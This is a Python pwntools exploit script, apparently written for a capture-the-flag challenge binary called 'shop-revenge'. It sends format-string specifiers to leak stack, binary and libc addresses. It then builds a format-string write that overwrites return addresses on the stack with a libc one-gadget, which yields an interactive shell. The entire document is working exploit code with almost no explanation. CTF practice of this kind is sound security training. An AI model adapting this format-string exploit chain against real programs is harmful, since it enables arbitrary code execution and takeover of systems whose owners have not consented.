#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./shop-revenge")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

io = gdb.debug(exe.path, '')
# io = remote('localhost', 1337)
# io = process('nc the-ingredient-shop-s-revenge.challs.brunnerne.xyz 32000'.split())
io = process(exe.path)



payload = ""
for i in range(0, 61): # 从第 7 个参数开始（跳过寄存器），看后面 50 多个堆叠上的值
    payload += f"%{i}$p."
io.sendline(payload.encode())
io.sendlineafter(b'exit\n', b'%42$p-%43$p-%45$p')
io.recvuntil(b'here is your choice\n')
stack_leak, exe_leak, libc_leak = map(lambda n : int(n, 16), io.recvline().strip().split(b'-'))
exe.address = exe_leak-0x1423
libc.address = libc_leak-0x2a1ca

payload = fmtstr_payload(8, writes={
    (stack_leak-8) : p64(libc.address+0xef52b),
    (stack_leak-16) : p64(exe.address+0x4578)
})
io.sendlineafter(b'exit\n', payload)
io.interactive()


